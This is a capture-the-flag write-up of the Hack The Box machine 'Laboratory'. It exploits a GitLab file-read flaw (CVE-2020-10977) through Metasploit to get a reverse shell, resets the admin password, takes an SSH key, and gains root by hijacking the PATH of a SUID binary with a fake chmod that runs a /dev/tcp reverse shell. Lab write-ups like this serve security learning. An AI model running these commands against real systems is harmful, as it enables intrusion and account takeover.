---
layout: single
title: "Hackthebox write-up: Laboratory"
namespace: htb-laboratory
category: Writeup
tags: HackTheBox htb-easy htb-linux
date: 2021-04-17 16:00:00
header:
   teaser: https://i.imgur.com/t7eWqy0.png
---

Hello everyone!

The machine of this week wil be **Laboratory**, another Linux box easy rated from [Hack The Box](https://www.hackthebox.eu), created by [0xc45](https://app.hackthebox.eu/users/73268). <!--more-->

:information_source: **Info**: Write-ups for Hack the Box are always posted as soon as machines get retired.
{: .notice--info}

![laboratory-image](https://i.imgur.com/6fqKuas.png){: .align-center}

## Enumeration

As usual, we start with published services enumeration using an `nmap` quick scan:

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.216                                                                   
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-18 15:50 -03
Nmap scan report for 10.10.10.216
Host is up (0.16s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)
|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)
|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
| tls-alpn: 
|_  http/1.1
Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.96 seconds
```

After running it, noticed that besides the SSH service, 2 HTTP services (HTTP and HTTPS) were published in their default ports and the certificate for the HTTPS service mentions 2 DNS entries, which were added to local hosts file to enumerate them properly: `laboratory.htb` e `git.laboratory.htb`.

### 80/TCP - HTTP Service

Accessing this service from IP and any of the DNS entries, noticed that there's a redirection to HTTPS, which will be discussed in the next section.

### 443/TCP - HTTPS Service

After starting the enumeration, noticed that for each DNS entry published, we have a different service available.

### `https://laboratory.htb`

Accessing this webpage, we have an institutional website from a company called Laboratory where Dexter, Dee Dee and Anonymous are the employees, but nothing interesting was found during the validation.

![laboratory htb](https://i.imgur.com/Fowr3Hn.png){: .align-center}

#### Gobuster

To make sure that anything else is hidden in this website, started scanning using `gobuster` dir mode, but anything interesting was found.

```bash
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://laboratory.htb -x html,php,txt -k
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://laboratory.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,txt
[+] Timeout:        10s
===============================================================
2021/02/18 16:12:44 Starting gobuster
===============================================================
/images (Status: 301)
/index.html (Status: 200)
/assets (Status: 301)
/CREDITS.txt (Status: 200)
Progress: 38301 / 220561 (17.37%)
```

### `https://git.laboratory.htb`

As the other DNS entry gave us almost nothing, decided to poke a little with the `git` subdomain, where we can see an instance of [GitLab](https://about.gitlab.com/) Server, as below.

![gitab laboratory htb](https://i.imgur.com/dL6VMKv.png){: .align-center}

After some research, found taht API V2 would disclose some information in an unauthenticated way but this enumeration has also resulted in nothing, once the GitLab Server has an API V4 which fixes the issues found.

```bash
$ curl -L https://git.laboratory.htb/api/v3/internal/check -k                                               
{"error":"API V3 is no longer supported. Use API V4 instead."}                                           
                                                                    
$ curl -L https://git.laboratory.htb/api/v4/internal/check -k                                               
{"message":"401 Unauthorized"}
```

As using the enumeration method, I found also didn't worked, decided to try creating an account on the instance and had success, besides being mandatory to use an e-mail belonging to an authorized domain (*laboratory.htb*) but no confirmation was required.

Once logged with the newly created account, started browsing the public repositories where I found the **SecureWebSite**.

![gitlab projects](https://i.imgur.com/2FARHEv.png){: .align-center}

This repository belongs to the website published to `https://laboratory.htb`, where we would be able to get some interesting information if it weren't a single page application.

Once we had logon rights now to GitLab, decided to look for the server instance running, where under *Help > Help* we could identify version 12.8.1 Community for this implementation.

![gitlab version](https://i.imgur.com/ygc0H7j.png){: .align-center}

Searching using `searchsploit` I have found some vulnerabilities that could be explored, identified as **Arbitrary File Read**.

```bash
$ searchsploit gitlab
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
GitLab - 'impersonate' Feature Privilege Escalation                    | ruby/webapps/40236.txt
GitLab 11.4.7 - RCE (Authenticated)                                    | ruby/webapps/49334.py
Gitlab 11.4.7 - Remote Code Execution                                  | ruby/webapps/49257.py
GitLab 11.4.7 - Remote Code Execution (Authenticated)                  | ruby/webapps/49263.py
GitLab 12.9.0 - Arbitrary File Read                                    | ruby/webapps/48431.txt
Gitlab 12.9.0 - Arbitrary File Read (Authenticated)                    | ruby/webapps/49076.py
Gitlab 6.0 - Persistent Cross-Site Scripting                           | php/webapps/30329.sh
Gitlab-shell - Code Execution (Metasploit)                             | linux/remote/34362.rb
Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting      | java/webapps/47927.txt
NPMJS gitlabhook 0.0.17 - 'repository' Remote Command Execution        | json/webapps/47420.txt
----------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

After a few attempts I had no success with the provided scripts. Researching a little more, I came across [CVE-2020-10977 in MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10977) which is related to the vulnerability we're trying to abuse and, after finding it, I found another exploit in GitHub in [thewhiteh4t/cve-2020-10977: GitLab 12.9.0 Arbitrary File Read (github.com)](https://github.com/thewhiteh4t/cve-2020-10977) which was later used.

With this script we were able to confirm that it is vulnerable and be able to read the `/etc/passwd`.

```bash
$ python3 ./cve_2020_10977.py https://git.laboratory.htb dummy P@ssw0rd                                   
----------------------------------                                                                       
--- CVE-2020-10977 ---------------       
--- GitLab Arbitrary File Read ---               
--- 12.9.0 & Below ---------------    
----------------------------------                                                                       
                                                                                                         
[>] Found By : vakzz       [ https://hackerone.com/reports/827052 ]
[>] PoC By   : thewhiteh4t [ https://twitter.com/thewhiteh4t      ]
                                                                                                         
[+] Target        : https://git.laboratory.htb                                                           
[+] Username      : dummy                                                                                
[+] Password      : P@ssw0rd
[+] Project Names : ProjectOne, ProjectTwo

[!] Trying to Login...         
[+] Login Successful!
[!] Creating ProjectOne...
[+] ProjectOne Created Successfully!
[!] Creating ProjectTwo...
[+] ProjectTwo Created Successfully!
[>] Absolute Path to File : /etc/passwd
[!] Creating an Issue...
[+] Issue Created Successfully!
[!] Moving Issue...
[+] Issue Moved Successfully!
[+] File URL : https://git.laboratory.htb/dummy/ProjectTwo/uploads/09bddb24c9ac93d1a011f6ed14054a66/passwd

> /etc/passwd
```

Checking the contents of `/etc/passwd` we can see that the users of this box, besides *root* and *ssh* share the `/var/opt/gitlab` in their home paths, where we'll look for interesting files.

```bash
$ cat etc_passwd | grep sh | awk -F":" '{print $6","$1}'
/root,root
/var/run/sshd,sshd
/var/opt/gitlab,git
/var/opt/gitlab/postgresql,gitlab-psql
/var/opt/gitlab/mattermost,mattermost
/var/opt/gitlab/registry,registry
/var/opt/gitlab/prometheus,gitlab-prometheus
/var/opt/gitlab/consul,gitlab-consul
```

## Initial Foothold

Already knowing about a few accounts and the possibility to read files in arbitrarily, I was searching how to convert this LFI to an RCE, to be able to get a reverse shell in this box. After some research I have found [a Metasploit Module](https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/) that makes use of this same vulnerability to obtain the `secret_key_base` from GitLab, and, with a deserialization call in the obtained cookie, obtain a reverse shell as the running account, in this case **git**.

```bash
msf6 exploit(multi/http/gitlab_file_read_rce) > run

[*] Started reverse TCP handler on 10.10.10.10:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version.
[*] Logged in to user jdoe
[*] Created project /jdoe/vWL4JJIQ
[*] Created project /jdoe/NVfFvw3v
[*] Created issue /jdoe/vWL4JJIQ/issues/1
[*] Executing arbitrary file load
[+] File saved as: '/home/zurc/.msf4/loot/20210219090516_default_10.10.10.216_gitlab.secrets_242811.txt'
[+] Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
[*] NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file read
[*] Attempting to delete project /jdoe/vWL4JJIQ
[*] Deleted project /jdoe/vWL4JJIQ
[*] Attempting to delete project /jdoe/NVfFvw3v
[*] Deleted project /jdoe/NVfFvw3v
[*] Command shell session 1 opened (10.10.10.10:4444 -> 10.10.10.216:35138) at 2021-02-19 09:05:22 -0300

id
uid=998(git) gid=998(git) groups=998(git)
```

## User flag

With access to the machine, started enumerating using `linpeas.sh` from [PEAS Suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/README.md). This helped me a lot once I could learn the possibilities while exploiting a GitLab server. The script detects that the service is installed and returned some interesting information about the machine itself:

- GitLab accounts, where **dexter** (admin@example.com) is an administrator.
- We are running from a docker container, where we might be required to escape it to exploit the machine itself.

One of the possibilities listed by `linpeas.sh` is that we could change the password from any user, which was successfully done for dexter after running the commands below:

```bash
git@git:~/gitlab-rails$ gitlab-rails console
--------------------------------------------------------------------------------
 GitLab:       12.8.1 (d18b43a5f5a) FOSS
 GitLab Shell: 11.0.0
 PostgreSQL:   10.12
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.2)
irb(main):001:0> user = User.find_by(email: "admin@example.com")
=> #<User id:1 @dexter>
irb(main):002:0> user.password = "P@ssw0rd"
=> "P@ssw0rd"
irb(main):003:0> user.password_confirmation = "P@ssw0rd"
=> "P@ssw0rd"
irb(main):004:0> user.save!
Enqueued ActionMailer::DeliveryJob (Job ID: 0f18c1b4-9929-47a5-90d7-ec16a7e6f293) to Sidekiq(mailers) with arguments: "DeviseMailer", "password_change", "deliver_now", #<GlobalID:0x00007fa424ee0668 @uri=#<URI::GID gid://gitlab/User/1>>
=> true
irb(main):005:0> 
```

After changed its password, I was able to login with his account and see other repositories in his shoes, where we found a **SecureDocker** private repo, which called a lot of attention.

![gitlab dexter projects](https://i.imgur.com/oXJEKFR.png){: .align-center}

Once we have access to the source code, downloaded its contents and found some interesting information used to build the container and a **SSH key** from dexter under his personal stuff, as mentioned in repo's description.

> CONFIDENTIAL - Secure docker configuration for homeserver. Also some personal stuff, I'll figure that out later.

After cloning it, we were able to see the following information:

```bash
$ git -c http.sslVerify=false clone http://git.laboratory.htb/dexter/securedocker.git  
Cloning into 'securedocker'...
Username for 'https://git.laboratory.htb': dexter
Password for 'https://dexter@git.laboratory.htb': 
warning: redirecting to https://git.laboratory.htb/dexter/securedocker.git/
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 10 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (10/10), done.
```

```bash
$ tree -a -I '.git'
.
├── create_gitlab.sh
├── dexter
│   ├── recipe.url
│   ├── .ssh
│   │   ├── authorized_keys
│   │   └── id_rsa
│   └── todo.txt
└── README.md

2 directories, 6 files
```

Just like we did on [Luanne]({% post_url 2021-03-27-htb-luanne %}), we have converted it to an RSA key using the commands below:

```bash
$ ssh-keygen -p -m PEM -f ./id_rsa
Key has comment 'root@laboratory'
Enter new passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved with the new passphrase.
$ chmod 600 id_rsa
```

After the mentioned process, I was able to SSH to the machine and get the user flag under Dexter's account:

  ```bash
  $ ssh -i id_rsa dexter@10.10.10.216
  dexter@laboratory:~$ ls -la
  total 40
  drwxr-xr-x 6 dexter dexter 4096 Oct 22 08:42 .
  drwxr-xr-x 3 root   root   4096 Jun 26  2020 ..
  lrwxrwxrwx 1 root   root      9 Jul 17  2020 .bash_history -> /dev/null
  -rw-r--r-- 1 dexter dexter  220 Feb 25  2020 .bash_logout
  -rw-r--r-- 1 dexter dexter 3771 Feb 25  2020 .bashrc
  drwx------ 2 dexter dexter 4096 Jun 26  2020 .cache
  drwx------ 2 dexter dexter 4096 Oct 22 08:14 .gnupg
  drwxrwxr-x 3 dexter dexter 4096 Jun 26  2020 .local
  -rw-r--r-- 1 dexter dexter  807 Feb 25  2020 .profile
  drwx------ 2 dexter dexter 4096 Jun 26  2020 .ssh
  -r--r----- 1 root   dexter   33 Feb 19 11:06 user.txt
  dexter@laboratory:~$ cat user.txt 
  <redacted>
  ```

## Root flag

After running `linpeas.sh` again, this time in the real machine, noticed that there's an SUID file with permissions attributed to the user **dexter**.

```bash
dexter@laboratory:~$ ls -la /usr/local/bin/docker-security
-rwsr-xr-x 1 root dexter 16720 Aug 28 14:52 /usr/local/bin/docker-security
```

Executing this binary, I couldn't see any output, as well as no information/help is shown when used parameters like `--version` and `--help`. Analyzing the binary further, noticed that it's an ELF, which could be abused somehow using a path hijack or buffer overflow.

```bash
dexter@laboratory:~$ file /usr/local/bin/docker-security
/usr/local/bin/docker-security: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d466f1fb0f54c0274e5d05974e81f19dc1e76602, for GNU/Linux 3.2.0, not stripped
```

Before using disassembly tools, inspected the files strings from the attacker machine (once `strings` wasn't available in this box) and some entries called attention: two calls to `chmod` to redefine docker directories permissions, but without specifying the full path to the binary, confirming the suspicion that **it is vulnerable to path hijacking**.

```bash
$ strings docker-security
[...]

[]A\A]A^A_
chmod 700 /usr/bin/docker
chmod 660 /var/run/docker.sock
;*3$"
GCC: (Debian 10.1.0-6) 10.1.0

[...]
```

### Path hijack

To get `root` privileges, the first step is to create a fake `chmod`, in this case to return a reverse shel to the attacker machine. After that we need to modify user's PATH variable so we can call our own chmod file instead of the one previously installed. The steps below achieve the tasks mentioned:

```bash
dexter@laboratory:~$ echo '#!/bin/bash' > /dev/shm/chmod
dexter@laboratory:~$ echo 'bash -i >& /dev/tcp/10.10.10.10/4443 0>&1' >> /dev/shm/chmod
dexter@laboratory:~$ chmod +x /dev/shm/chmod
dexter@laboratory:~$ PATH=/dev/shm:$PATH
dexter@laboratory:~$ echo $PATH
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
```

After starting the listener in the port defined in the fake chmod binary (`nc -lnvp 4443`), executed `docker-security` which gave us the very expected root access, allowing us to read the root flag.

```bash
$ nc -lnvp 4443                                                                                             
listening on [any] 4443 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.216] 44754
root@laboratory:~# id  
id
uid=0(root) gid=0(root) groups=0(root),1000(dexter)
root@laboratory:~# cat /root/root.txt
cat /root/root.txt
<redacted>
```

I hope you guys have enjoyed this box resolution.

See you in the next post soon! :smiley: